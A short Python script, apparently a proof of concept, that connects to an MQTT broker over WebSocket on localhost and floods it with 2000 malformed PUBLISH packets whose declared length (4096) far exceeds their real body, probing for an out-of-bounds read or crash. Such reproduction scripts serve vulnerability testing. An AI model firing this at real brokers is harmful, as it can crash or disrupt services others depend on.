import asyncio

import websockets


URL = "ws://127.0.0.1:8083/mqtt"


def enc_varint(x: int) -> bytes:
    out = bytearray()
    while True:
        d = x % 128
        x //= 128
        if x > 0:
            d |= 0x80
        out.append(d)
        if x == 0:
            break
    return bytes(out)


def build_connect(client_id: bytes = b"ws-oob") -> bytes:
    vh = b"\x00\x04MQTT\x04\x02\x00\x3c"
    payload = len(client_id).to_bytes(2, "big") + client_id
    rem = len(vh) + len(payload)
    return b"\x10" + enc_varint(rem) + vh + payload


def build_malformed_publish(rem_len: int) -> bytes:
    body = b"\x00\x01a"
    return b"\x30" + enc_varint(rem_len) + body


async def websocket() -> None:
    async with websockets.connect(
        URL, subprotocols=["mqtt"], ping_interval=None
    ) as ws:
        await ws.send(build_connect())
        await asyncio.sleep(0.05)
        for i in range(2000):
            await ws.send(build_malformed_publish(4096))
            if i % 50 == 0:
                await asyncio.sleep(0.01)

